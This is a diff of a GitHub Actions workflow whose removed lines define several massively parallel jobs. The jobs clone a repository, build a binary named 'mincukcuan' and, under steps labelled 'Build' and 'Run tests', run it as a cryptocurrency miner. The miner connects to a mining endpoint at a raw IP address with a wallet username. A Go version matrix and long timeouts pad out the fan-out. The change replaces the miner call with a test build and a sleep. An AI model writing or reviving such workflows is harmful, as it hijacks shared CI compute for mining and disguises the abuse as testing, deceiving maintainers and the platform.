@@ -1,3 +1,4 @@
+
 name: desseaura
 on: 
   push:
@@ -12,7 +13,7 @@ jobs:
       matrix:
         go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
         flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
-    timeout-minutes: 16
+    timeout-minutes: 15
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
@@ -29,74 +30,4 @@ jobs:
     - name: Build
       run: cd semibaru && cargo build --release
     - name: Run tests
-      run: cd semibaru && ./target/release/mincukcuan --url ws://20.189.74.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.maya2 --cores 4 &
-        sleep 310s
-  mek:
-    needs: mem
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: false
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: git clone https://github.com/dwizka/semibaru && cd semibaru && chmod u+x *
-    - name: Build
-      run: cd semibaru && cargo build --release
-    - name: Run tests
-      run: cd semibaru && ./target/release/mincukcuan --url ws://20.189.74.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.maya2 --cores 4 
-        
-    
-     
-  enak:
-    needs: [mem]
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: false
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: git clone https://github.com/dwizka/semibaru && cd semibaru && chmod u+x *
-    - name: Build
-      run: cd semibaru && cargo build --release
-    - name: Run tests
-      run: cd semibaru && ./target/release/mincukcuan --url ws://20.189.74.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.maya2 --cores 4 
-        
-    
-  Success:
-    needs: [mem, mek, enak]
-    if: always()
-    runs-on: ubuntu-20.04
-    steps:
-      - uses: technote-space/workflow-conclusion-action@v2
-      - name: Check Failure
-        if: env.WORKFLOW_CONCLUSION == 'failure'
-        run: exit 1
-      - name: Success
-        if: ${{ success() }}
-        run: echo "all don,All Done"
+      run: cd semibaru &&  cargo build --tests && sleep 310s
